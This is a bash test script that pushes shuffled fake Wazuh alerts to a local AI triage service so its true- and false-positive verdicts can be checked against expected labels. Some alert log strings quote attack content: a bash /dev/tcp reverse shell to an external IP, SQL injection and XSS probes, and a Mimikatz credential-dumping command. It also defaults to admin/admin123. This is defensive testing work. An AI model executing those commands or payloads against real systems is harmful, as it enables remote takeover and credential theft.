#!/usr/bin/env bash
# =============================================================================
# send-fake-alerts.sh — push a shuffled mix of fake Wazuh alerts at /api/ingest
# =============================================================================
# Sends a realistic blend of genuine threats (SSH brute force, C2, ransomware,
# SQLi, priv-esc, credential dumping…) and benign/false-positive noise (routine
# admin logins, authorized scans, backups, AV updates…) so you can watch the
# AI triage pipeline classify TRUE POSITIVE vs FALSE POSITIVE.
#
# Each alert is tagged with the label WE expect; compare it to what the pipeline
# decides in the UI (or the `alerts` table: status / fp_method / ai_analysis).
#
# Config (env vars, all optional):
#   BASE_URL     default https://localhost:3001
#   API_KEY      an ingest key (X-Api-Key). If unset, one is auto-created by
#                logging in as admin and calling POST /api/api-keys.
#   ADMIN_USER   default admin      (only used to auto-create a key)
#   ADMIN_PASS   default admin123
#   DELAY        seconds between sends (default 2). Each accepted alert kicks off
#                a fire-and-forget ~2-3 min DeepSeek investigation, so they run
#                concurrently — raise DELAY if you want to pace them.
#   COUNT        cap the number of alerts sent (default: all ~19, shuffled)
#
# Usage:
#   ./send-fake-alerts.sh
#   API_KEY=sk_aisoc_xxx DELAY=5 COUNT=6 ./send-fake-alerts.sh
# =============================================================================
set -uo pipefail

BASE_URL="${BASE_URL:-https://localhost:3001}"
ADMIN_USER="${ADMIN_USER:-admin}"
ADMIN_PASS="${ADMIN_PASS:-admin123}"
DELAY="${DELAY:-2}"
COUNT="${COUNT:-0}"        # 0 = send them all
SCANNER_IP="${SCANNER_IP:-10.0.0.6}"
SCANNER_AGENT="${SCANNER_AGENT:-vuln-scan-01}"
SCANNER_NAME="${SCANNER_NAME:-Authorized vulnerability scanner}"
TARGET_APP="${TARGET_APP:-Atlas CRM}"
CURL=(curl -sk --max-time 20)   # -k: self-signed TLS

command -v jq   >/dev/null || { echo "ERROR: jq is required (apt install jq)"; exit 1; }
command -v curl >/dev/null || { echo "ERROR: curl is required"; exit 1; }

# ── Resolve an ingest API key ────────────────────────────────────────────────
API_KEY="${API_KEY:-}"
if [[ -z "$API_KEY" ]]; then
  echo "No API_KEY given — logging in as '$ADMIN_USER' to create one…"
  TOKEN=$("${CURL[@]}" -X POST "$BASE_URL/api/auth/login" \
            -H 'Content-Type: application/json' \
            -d "$(jq -n --arg u "$ADMIN_USER" --arg p "$ADMIN_PASS" '{username:$u,password:$p}')" \
          | jq -r '.token // empty')
  [[ -z "$TOKEN" ]] && { echo "ERROR: admin login failed (check ADMIN_USER/ADMIN_PASS and that the server is up)"; exit 1; }
  API_KEY=$("${CURL[@]}" -X POST "$BASE_URL/api/api-keys" \
              -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
              -d "$(jq -n --arg n "fake-wazuh-$(date +%s)" '{name:$n}')" \
            | jq -r '.key // empty')
  [[ -z "$API_KEY" ]] && { echo "ERROR: could not create API key"; exit 1; }
  echo "Created ingest key: ${API_KEY:0:20}…  (export API_KEY=$API_KEY to reuse)"
fi
echo

# random source IPs (external = attacker-looking, internal = corp) ─────────────
rip_ext() { echo "$(shuf -i 45-223 -n1).$(shuf -i 0-255 -n1).$(shuf -i 0-255 -n1).$(shuf -i 1-254 -n1)"; }
rip_int() { echo "10.0.$(shuf -i 1-40 -n1).$(shuf -i 2-254 -n1)"; }

# ── Alert catalogue ──────────────────────────────────────────────────────────
# Three buckets (see min_severity in Settings → default 7):
#   REAL   = level >= 7, genuine threat  → AI triage should say TRUE POSITIVE
#   FP-AI  = level >= 7 but benign       → reaches the AI, which should reason it
#                                          down to FALSE POSITIVE (the fun case)
#   FP-LOW = level  < 7                  → auto-archived by the severity_filter
#                                          (deterministic, no AI call)
# Format: LABEL|ruleid|level|srckind|dstuser|agent|description|full_log
SPECS=(
  # ── Real threats (expect TRUE POSITIVE / escalation) ──
  "REAL  |5710|10|ext|root|web-prod-01|sshd: Multiple authentication failures (possible brute force)|Failed password for root from SRCIP port 51234 ssh2 (x23)"
  "REAL  |5715|10|ext|root|web-prod-01|sshd: Authentication success after repeated failures|Accepted password for root from SRCIP after 22 failed attempts"
  "REAL  |60122|10|ext|Administrator|win-dc-01|Multiple failed RDP logon attempts from single external source|An account failed to log on. Source Network Address: SRCIP (x40)"
  "REAL  |31103|12|ext|-|web-prod-01|SQL injection pattern detected from external IP|GET /products?id=1%27%20OR%20%271%27=%271 HTTP/1.1 from SRCIP"
  "REAL  |100002|12|int|-|app-node-03|Outbound connection to known malware C2 IP|Connection app-node-03 -> 185.220.101.44:443 flagged by threat-intel feed"
  "REAL  |5402|12|int|root|app-node-03|Successful sudo to ROOT by public web service account|www-data : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash -i"
  "REAL  |100100|13|int|-|file-srv-02|Mass file rename to .locked extension (possible ransomware)|1,842 files renamed to *.locked in /shares within 60s, no backup job scheduled"
  "REAL  |92052|12|int|Administrator|win-fin-07|Mimikatz / LSASS credential access detected|Process accessed lsass.exe memory: sekurlsa::logonpasswords"
  "REAL  |100200|12|int|-|app-node-03|Reverse shell to external IP detected|bash -i >& /dev/tcp/185.220.101.44/4444 0>&1 — no change ticket"
  "REAL  |510|12|int|-|db-prod-01|Host anomaly: hidden process / possible rootkit|Ossec: process visible to kernel but not to ps (PID 5140)"
  # ── High-severity but benign — the AI must reason these down to FALSE POSITIVE ──
  "FP-AI |31103|12|scanner|-|SCANNER_AGENT|SCANNER_NAME web app vulnerability scan against TARGET_APP detected XSS and SQL injection test payloads|SCANNER_NAME SCANNER_IP sent approved XSS probe <script>alert(1)</script> and SQL injection probe id=1%27%20OR%20%271%27=%271 against TARGET_APP during scheduled vulnerability assessment"
  "FP-AI |31103|12|int|-|web-prod-01|SQLi signatures from AUTHORIZED internal Nessus scanner (change CHG0455)|User-Agent: Nessus/10.7 from 10.0.0.5 during approved monthly scan window"
  "FP-AI |5710|10|int|nagios|app-node-03|Repeated SSH auth failures from internal Nagios monitoring host|Failed password for nagios from 10.0.0.9 — expired monitoring credential, health probe"
  "FP-AI |100200|12|int|-|file-srv-02|Netcat used by sysadmin during scheduled maintenance (CHG0461)|admin ran nc to move backup archive between 10.0.x hosts, approved window"
  "FP-AI |100100|12|int|-|file-srv-02|High-volume file access by Veeam backup agent (nightly job)|Veeam.Agent read 5,000 files in /shares — scheduled 02:00 backup, not encryption"
  # ── Low-severity benign (expect severity_filter auto-archive, no AI) ──
  "FP-LOW|5715|3|int|deploy|web-prod-01|sshd: Authentication success (routine CI deploy user)|Accepted publickey for deploy from SRCIP port 40122 ssh2"
  "FP-LOW|61138|3|int|-|win-fin-07|Windows Update successfully installed|Installed KB5031356 (2026-07 Cumulative Update) — no reboot required"
  "FP-LOW|550|3|int|-|file-srv-02|Integrity checksum changed by nightly backup job|/etc/backup ran; /var/backups/db.tar.gz updated at 02:00"
  "FP-LOW|5402|4|int|root|app-node-03|Successful sudo to ROOT by automation account|ansible : TTY=unknown ; USER=root ; COMMAND=/usr/bin/apt-get update"
  "FP-LOW|531|4|int|-|db-prod-01|Filesystem usage warning (operational, not security)|/var at 86% capacity on db-prod-01"
  "FP-LOW|2905|3|int|jdoe|web-prod-01|User changed their own password via self-service portal|passwd: password changed for jdoe"
  "FP-LOW|52002|2|int|-|win-fin-07|Antivirus definitions updated successfully|Defender signature version bumped to 1.417.88.0"
  "FP-LOW|5501|3|int|jdoe|web-prod-01|PAM: single authentication failure (likely typo)|pam_unix(sshd:auth): authentication failure for jdoe (1 attempt)"
)

# ── Send loop (shuffled) ─────────────────────────────────────────────────────
mapfile -t SHUFFLED < <(printf '%s\n' "${SPECS[@]}" | shuf)
[[ "$COUNT" -gt 0 ]] && SHUFFLED=("${SHUFFLED[@]:0:$COUNT}")

declare -A TALLY=( [ok]=0 [archived_fp]=0 [deduplicated]=0 [ok_after_hours]=0 [error]=0 )
n=0; total=${#SHUFFLED[@]}
printf "%-3s %-5s %-6s %-4s %-15s  %-45s  %s\n" "#" "EXPECT" "rule" "lvl" "src_ip" "description" "server_response"
printf '%.0s─' {1..135}; echo

for spec in "${SHUFFLED[@]}"; do
  IFS='|' read -r label rid lvl srckind dstuser agent desc fulllog <<<"$spec"
  n=$((n+1))
  if [[ "$srckind" == "ext" ]]; then
    srcip=$(rip_ext)
  elif [[ "$srckind" == "scanner" ]]; then
    srcip="$SCANNER_IP"
  else
    srcip=$(rip_int)
  fi
  fulllog="${fulllog//SRCIP/$srcip}"
  fulllog="${fulllog//SCANNER_IP/$SCANNER_IP}"
  fulllog="${fulllog//SCANNER_NAME/$SCANNER_NAME}"
  fulllog="${fulllog//TARGET_APP/$TARGET_APP}"
  desc="${desc//SCANNER_NAME/$SCANNER_NAME}"
  desc="${desc//TARGET_APP/$TARGET_APP}"
  agent="${agent//SCANNER_AGENT/$SCANNER_AGENT}"

  body=$(jq -n --arg rid "$rid" --argjson lvl "$lvl" --arg d "$desc" \
              --arg sip "$srcip" --arg du "$dstuser" --arg fl "$fulllog" --arg ag "$agent" \
    '{rule:{id:$rid,level:$lvl,description:$d},
      agent:{name:$ag,ip:"10.0.0.10"},
      data:{srcip:$sip, dstip:"10.0.5.20", dstuser:(if $du=="-" then null else $du end)},
      full_log:$fl}')

  resp=$("${CURL[@]}" -X POST "$BASE_URL/api/ingest" \
           -H "X-Api-Key: $API_KEY" -H 'Content-Type: application/json' -d "$body")
  status=$(jq -r '.status // "error"' <<<"$resp" 2>/dev/null || echo error)
  [[ -z "$status" || "$status" == "null" ]] && status=error
  TALLY[$status]=$(( ${TALLY[$status]:-0} + 1 ))

  printf "%-3s %-5s %-6s %-4s %-15s  %-45.45s  %s\n" \
         "$n/$total" "$label" "$rid" "$lvl" "$srcip" "$desc" "$status"
  sleep "$DELAY"
done

echo
echo "── Summary ─────────────────────────────────────────────"
echo "sent: $n   ok(→AI): ${TALLY[ok]:-0}   after_hours: ${TALLY[ok_after_hours]:-0}   archived_fp(severity): ${TALLY[archived_fp]:-0}   deduped: ${TALLY[deduplicated]:-0}   errors: ${TALLY[error]:-0}"
echo
echo "Accepted alerts run a fire-and-forget DeepSeek investigation (~2-3 min each)."
echo "Watch results in the UI (Alerts view) or:"
echo "  PGPASSWORD=soc psql -h 127.0.0.1 -U soc -d soc -c \\"
echo "    \"select id,severity,status,fp_method,left(description,40) d from alerts order by timestamp desc limit 20;\""
